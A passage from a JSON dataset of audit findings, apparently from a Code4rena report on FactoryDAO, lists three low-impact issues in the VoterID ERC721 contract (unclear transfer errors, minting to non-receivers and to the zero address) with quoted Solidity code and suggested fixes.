      "impact": "LOW",
      "content": "<h2 id=\"l-06-voteridtransferfrom-does-not-distinguish-nonexistent-tokens-from-unapproved-transfers\" style=\"position:relative;\"><a href=\"#l-06-voteridtransferfrom-does-not-distinguish-nonexistent-tokens-from-unapproved-transfers\" aria-label=\"l 06 voteridtransferfrom does not distinguish nonexistent tokens from unapproved transfers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] <code>VoterID#transferFrom</code> does not distinguish nonexistent tokens from unapproved transfers</h2>\n<p>Unlike other common ERC721 implementations, <code>VoterID</code> does not distinguish an attempt to transfer a nonexistent token from an unapproved transfer:</p>\n<p><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L198-L201\"><code>VoterId#transferFrom</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">isApproved</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">), </span><span class=\"mtk8\">'Identity: Unapproved transfer'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Consider checking that a token exists in <code>isApproved</code> to distinguish attempts to transfer nonexistint tokens. (See OpenZeppelin <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4fb3a89f9d0a39c7ee6f2601d33ffbf30085322/contracts/token/ERC721/ERC721.sol#L232\"><code>ERC721#_isApprovedOrOwner</code></a> for an example).</p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "#l-06-voteridtransferfrom-does-not-distinguish-nonexistent-tokens-from-unapproved-transfers",
      "tags": [],
      "finders": []
    },
    {
      "id": "5416",
      "title": "[L-03] ",
      "impact": "LOW",
      "content": "<h2 id=\"l-03-voterid-token-can-be-minted-to-non-erc721-receivers\" style=\"position:relative;\"><a href=\"#l-03-voterid-token-can-be-minted-to-non-erc721-receivers\" aria-label=\"l 03 voterid token can be minted to non erc721 receivers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] <code>VoterID</code> token can be minted to non-ERC721 receivers</h2>\n<p><code>VoterID</code> tokens can be minted to non-ERC721 receivers in <code>VoterID#createIdentityFor</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L122-L147\"><code>VoterID#createIdentityFor</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createIdentityFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uri</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">, </span><span class=\"mtk8\">'Only minter may create identity'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">'Token already exists'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">allTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// increment the number of identities</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// two way mapping for enumeration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ownershipMapIndexToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">]] = </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ownershipMapTokenToIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// set owner of new token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">owners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// increment balances for owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">] + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uriMap</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">uri</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IdentityCreated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Suggestion: check <code>checkOnERC721Received</code> in <code>createIdentityFor</code>. This callback introduces a reentrancy vector, so take care to ensure callers of <code>createIdentityFor</code> use a reentrancy guard or follow checks-effects-interactions:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createIdentityFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uri</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">, </span><span class=\"mtk8\">'Only minter may create identity'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">'Token already exists'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">'ERC721: mint to the zero address'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">allTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// increment the number of identities</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// two way mapping for enumeration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ownershipMapIndexToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">]] = </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ownershipMapTokenToIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// set owner of new token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">owners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// increment balances for owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">] + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uriMap</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">uri</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">checkOnERC721Received</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">, </span><span class=\"mtk8\">\"\"</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">\"Identity: transfer to non ERC721Receiver implementer\"</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IdentityCreated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "#l-03-voterid-token-can-be-minted-to-non-erc721-receivers",
      "tags": [],
      "finders": []
    },
    {
      "id": "5415",
      "title": "[L-02] ",
      "impact": "LOW",
      "content": "<h2 id=\"l-02-voterid-token-can-be-minted-to-the-zero-address\" style=\"position:relative;\"><a href=\"#l-02-voterid-token-can-be-minted-to-the-zero-address\" aria-label=\"l 02 voterid token can be minted to the zero address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] <code>VoterID</code> token can be minted to the zero address</h2>\n<p><code>VoterID</code> tokens can be minted to the zero address in <code>VoterID#createIdentityFor</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L122-L147\"><code>VoterID#createIdentityFor</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createIdentityFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uri</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">, </span><span class=\"mtk8\">'Only minter may create identity'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">'Token already exists'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">allTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// increment the number of identities</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numIdentities</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// two way mapping for enumeration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ownershipMapIndexToToken</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">]] = </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ownershipMapTokenToIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// set owner of new token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">owners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// increment balances for owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">] + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uriMap</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">uri</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IdentityCreated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Suggestion: validate <code>thisOwner</code> in <code>createIdentityFor</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createIdentityFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">thisOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uri</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">, </span><span class=\"mtk8\">'Only minter may create identity'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">thisToken</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">'Token already exists'</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span 